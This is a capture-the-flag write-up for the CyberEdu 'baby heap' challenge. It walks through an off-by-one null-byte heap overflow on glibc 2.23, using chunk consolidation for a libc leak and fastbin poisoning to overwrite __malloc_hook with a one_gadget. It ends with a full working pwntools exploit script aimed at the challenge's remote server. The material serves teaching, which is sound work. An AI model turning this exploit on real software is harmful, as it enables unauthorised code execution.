+++
date = '2026-05-11'
draft = false
title = 'CyberEdu baby heap Writeup'
ShowToc = true
tags = ["CyberEdu", "pwn", "heap"]
+++


## Challenge overview

In **[this challenge](https://app.cyber-edu.co/challenges/559febf0-7f21-11ea-be53-e5754acd68a0?tenant=cyberedu)** you can test your understanding about basic heap exploitation.

Just as a side note, I've put off doing heap challenges for the longest time ever, because I thought they were too bothersome, but that changes today, because we're solving this! So this is a great and notable milestone.

---

I wrote that ^ in February and it's May 11th now. 

![challenge-screenshot](lol.gif#center)

---

As the challenge suggests, this is a heap overflow.

We have three options: free, malloc and show.

```c
unsigned __int64 do_free()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Id: ");
  _isoc99_scanf("%u", &v1);
  if ( v1 <= 5 )
  {
    if ( *((_QWORD *)&unk_202040 + v1) )
    {
      free(*((void **)&unk_202040 + v1));
      *((_QWORD *)&unk_202040 + v1) = 0;
      puts("Successfully removed.\n");
    }
    else
    {
      puts("Id is not available.\n");
    }
  }
  else
  {
    puts("Invalid id.\n");
  }
  return __readfsqword(0x28u) ^ v2;
}
```

```c
unsigned __int64 do_malloc()
{
  unsigned int nbytes; // [rsp+4h] [rbp-21Ch] BYREF
  unsigned int nbytes_4; // [rsp+8h] [rbp-218h]
  unsigned int v3; // [rsp+Ch] [rbp-214h]
  char buf[520]; // [rsp+10h] [rbp-210h] BYREF
  unsigned __int64 v5; // [rsp+218h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v3 = 5;
  for ( nbytes_4 = 0; nbytes_4 <= 4; ++nbytes_4 )
  {
    if ( !*((_QWORD *)&unk_202040 + nbytes_4) )
    {
      v3 = nbytes_4;
      break;
    }
  }
  if ( v3 == 5 )
  {
    puts("No free space available. Try removing some data.\n");
  }
  else
  {
    printf("Size: ");
    _isoc99_scanf("%u", &nbytes);
    if ( nbytes <= 0x1FF )
    {
      printf("Input: ");
      nbytes = read(0, buf, nbytes);
      buf[nbytes] = 0;
      *((_QWORD *)&unk_202040 + v3) = malloc(nbytes);
      strcpy(*((char **)&unk_202040 + v3), buf);
      puts("Data was saved.\n");
    }
    else
    {
      puts("The maximum size was exceeded.\n");
    }
  }
  return __readfsqword(0x28u) ^ v5;
}
```

---

## Identifying the vulnerabilities

The *id*s of the chunks are stored at `&unk_202040`.

Here, we have a 1 byte overflow of our data; Except it's a null byte.

So by doing `malloc(a)`, `malloc(b)`, `free(a)` and `malloc(a)` again, except overflow this time,
we can modify the size of chunk `b`'s first byte.

I found this [resource](https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/off_by_one/), saying:

> The overflow byte is NULL. When the size is `0x100`, overflowing the NULL byte makes the `prev_in_use` bit clear, so the previous block is considered a free block. (1) At this point you can choose to use the unlink method (see the unlink section) for processing. 
>
> In addition, when the `prev_size` field is enabled, you can forge `prev_size`, causing overlap between blocks. The key to this method is that unlink does not check whether the last block of the block found by prev_size (theoretically the block currently unlinked) is equal to the block size currently being unlinked.

Interesting, so that's what we're dealing with. I looked and found another great [resource](https://devel0pment.de/?p=688), which solved what could be our exact challenge except with different names for the functions. I definitely recommend reading it; there's a lot of in-depth information about everything that's happening.

### The leak

What we need is a `libc` leak, and a `hook` overwrite.

But let's take things step by step.

All we can do now, is make it so the next address' `prev_inuse` flag will be null. That way, when we free it, we can have it trigger a consolidation with one of the previous chunks.

In order to do that, there's a couple of things we need to take into consideration.

A chunk's structure looks like this:

```c
struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```

So in order to consolidate a chunk with a previous one, we must also fake a `prev_size`, and have the previous chunk present valid `fd`/`bk` pointers.

We can absolutely get around this - we can create a REAL freed chunk (A), for the valid `fd`/`bk`, before a *buffer* chunk (B). 

Then, we're going to tell the null byte poisoned chunk (C) to treat the real freed chunk (A) and the buffer chunk (B) as one continuous chunk, by specifying the `prev_size` of both of them combined.

So when we free the poisoned chunk (C), it will attempt to create one huge chunk, all the way from the from A to C. To prevent it from consolidating with the wilderness, we will also add another smaller fastbin-size chunk after chunk C, which I'll call D.

But the thing is, chunk B hasn't been freed yet; So we can still print the information from there.

But right now, it shouldn't have any `fd` or `bk` pointers inside. Those are in the beginning of the huge continuous chunk.

To do that, we can malloc, and that will eat from continuous chunk's size; that will leave in the remaining free chunk the `fd` and `bk`. If we get the right size in the malloc, the free chunk pointers will overlap chunk B's data perfectly. 

And now, since we overwrote chunk B's metadata, we're going to have to restore it (the size field) in order to fit it into fastbins, so back to 0x70. More on why in the second part.

If I lost you, there are visual representations of this in the link I added above, so check it out.

This is the first part of the exploit; so let's get started.

---

First, I created all the chunks, freed A, and overwrote chunk C's `prev_inuse`:

```python
#chunk A
malloc(b"248", b"A"*247)
#chunk B
malloc(b"104", b"B"*103)
#chunk C
malloc(b"248", b"C"*247)
#chunk D
malloc(b"24", b"D"*23)

#free chunk A
free(b"0")

#turn chunk C's prev_inuse to 0 
free(b"1")
malloc(b"104", b"C"*104)

#after doing this, the index of chunk B will be 0
```

![challenge-screenshot](1.png#center)

Now, we need to create a fake `prev_size`. The data is moved through `strcpy`, which breaks on null bytes, though. So we're going to have to use the fact that the last byte of data of each `malloc` at position B will be turned into a null byte.

So we keep malloc-ing and freeing smaller and smaller chunks, until we reach our desired offset.

And keep in mind, now the index of chunk B will be 0, since we freed A, then B, then malloc-ed again; The slot in 0 is open again, and that's where B is going to be put.

```python
#create fake prev_size for chunk C
#first the null bytes
for i in range(1, 7):
    free(b"0")
    malloc(b"104", b"B"*(104-i))
```

Since the desired `prev_size` is of A's `size` + B's `size`, that's going to be `0x170`.

```python
free(b"0")
malloc(b"104", b"B"*(104-8)+b"\x70\x01")
```

![challenge-screenshot](2.png#center)

I realised that the libc version I was using for this was way too recent and invulnerable to this sort of stuff, so I switched to an older version for the sake of this challenge. (something in glibc 2.23).

Now, let's trigger the consolidation, by freeing chunk C.

![challenge-screenshot](3.png#center)

Nice! All went well! Next step, we malloc something to push the `fd` and `bk` into B's data.

```python3
#trigger consolidation of chunk C with previous chunk!
free(b"2")
malloc(b"248", b"A"*247)
```

![challenge-screenshot](4.png#center)

![challenge-screenshot](5.png#center)

The offset locally for me was `0x3c4b78`, hopefully we guessed the libc version correctly and we don't have to change this.

### The overwrite

Now, the hard part is over. What we want to do now is overwrite a hook, like `__malloc_hook` with a one_gadget/system. 

We can abuse the fastbins for this; If we send free chunk B of size 0x70, it will end up in the fastbin, and it will receive a `fd` address. When we free chunk B, the next head of the fastbins will be what's stored in `fd`.

If we overwrite `fd`, we control the address of the next element of the fastbin.

Then, the next time we malloc something of a simliar size, it will attempt to place it in the current head of the fastbin. Which is our controlled address.

The reason I'm referring to it as a controlled address is because we control the chunk before it, chunk A (or what's become of it). That way, we can finally pop a shell.

---

```python
#now, let's restore the size of chunk B so it fits back into fastbins
#the chunk A is now stored at index 1
free(b"1")
malloc(b"250", b"E"*250)

free(b"1")
malloc(b"250", b"E"*248+b"\x70")
```

Now, we free both chunk B and chunk E (that's what I'm going to call chunk A now), and overwrite the `fd` of B with the first valid chunk metadata before `__malloc_hook`:

```python
free(b"0")
free(b"1")

#malloc chunk E to overwrite the fd of chunk B. we want that to be find-fake-fast __malloc_hook.

malloc_hook_offset = 0x3c4b10
fake_hook_chunk = libc + malloc_hook_offset - 0x23
malloc(b"264", b"A"*256 + p64(fake_hook_chunk))
```

![challenge-screenshot](6.png#center)

Now, let's restore the integrity of poor chunk B again. We're freeing E and malloc-ing it again to restore the size and flags of chunk B.

```python
#restore chunk B's metadata through chunk E

for i in range(1, 7):
    free(b"0")
    malloc(b"256", b"E"*(256-i))

free(b"0")
malloc(b"250", b"E"*248+b"\x70")
```

Let's do the two mallocs as well, and see what happens:

```python
#chunk B
malloc(b"104", b"B"*103)

#malloc_hook
malloc(b"104", b"B"*103)
```

![challenge-screenshot](7.png#center)

Great - now we just need to overwrite it with a proper `one_gadget`!

And you won't believe what happened now. Maybe you remember I said I downloaded some random glibc 2.23 for testing. Well, I tried to get its one_gadgets, and none worked. So I scrolled through the source, to see what gadgets they used. I thought to myself, I surely downloaded the wrong libc, because there's no other way to solve this.

And, the third gadget from their list worked!! I tested them remotely right away, so I got the flag! I was very surprised to see it.

Anyways, I rewrote the last part like so:

```python
one_gadget = libc + 0xf02a4

#malloc_hook
malloc(b"104", b"B"*(19) + p64(one_gadget) + b"\x00"*65)

#gdb.attach(p, gdbscript = '''
#b * &__malloc_hook
#c
#''')

#one last malloc
malloc(b"24", b"F"*23)
```

![challenge-screenshot](flag.png#center)

## The full exploit

```python
from pwn import *
elf = ELF('./pwn')

context.arch = 'amd64'
cyberedu = '34.159.85.111:31989'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()


def malloc(size, data):
#select
    p.recvuntil(b": ")
    p.sendline(b"1")
#size
    p.recvuntil(b": ")
    p.sendline(size)
#data
    p.recvuntil(b": ")
    p.send(data)
    
    
    
def free(data_id):
#select
    p.recvuntil(b": ")
    p.sendline(b"2")    
#select ID
    p.recvuntil(b": ")
    p.sendline(data_id)
    
    
    
def show(data_id):
#select
    p.recvuntil(b": ")
    p.sendline(b"3")  
#select ID
    p.recvuntil(b": ")
    p.sendline(data_id)
    
    

#when it loops , it only checks if the 8 bytes at that address are null...

#0x100-8 turns to 0x101 chunk; 248
#0x68 turns to 0x71 chunk; 104
#0x18 turns to 0x21 chunk; 24

#chunk A
malloc(b"248", b"A"*246)
#chunk B
malloc(b"104", b"B"*103)
#chunk C
malloc(b"248", b"C"*247)
#chunk D
malloc(b"24", b"D"*23)

#free chunk A
free(b"0")


#turn chunk C's prev_inuse to 0 
free(b"1")
malloc(b"104", b"B"*104)

#after doing this, the index of chunk B will be 0

#create fake prev_size for chunk C
#first the null bytes
for i in range(1, 7):
    free(b"0")
    malloc(b"104", b"B"*(104-i))
    

free(b"0")
malloc(b"104", b"B"*(104-8)+b"\x70\x01")

#trigger consolidation of chunk C with previous chunk!
free(b"2")
malloc(b"248", b"A"*247)

show(b"0")
p.recvuntil(b": ")

data = p.recvline().strip()
val = u64(data.ljust(8, b"\x00"))
print(f"leaked fd is {hex(val)}")

leak_offset = 0x3c4b78
libc = val - leak_offset
print(f"leaked libc is {hex(libc)}")
#hope this is the same remotely , lol

#now, let's restore the size of chunk B so it fits back into fastbins
#the chunk A is now stored at index 1
free(b"1")
malloc(b"250", b"E"*250)

free(b"1")
malloc(b"250", b"E"*248+b"\x70")

#free chunk B, then free chunk A/E.

free(b"0")
free(b"1")

#malloc chunk E to overwrite the fd of chunk B. we want that to be find-fake-fast __malloc_hook.

malloc_hook_offset = 0x3c4b10
fake_hook_chunk = libc + malloc_hook_offset - 0x23
malloc(b"264", b"A"*256 + p64(fake_hook_chunk))

#restore chunk B's metadata through chunk E

for i in range(1, 7):
    free(b"0")
    malloc(b"256", b"E"*(256-i))

free(b"0")
malloc(b"250", b"E"*248+b"\x70")

#chunk B
malloc(b"104", b"B"*103)

one_gadget = libc + 0xf02a4

#malloc_hook
malloc(b"104", b"B"*(19) + p64(one_gadget) + b"\x00"*65)

#gdb.attach(p, gdbscript = '''
#b * &__malloc_hook
#c
#''')

#one last malloc
malloc(b"24", b"F"*23)

p.interactive()

```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/babyheap.py)**.
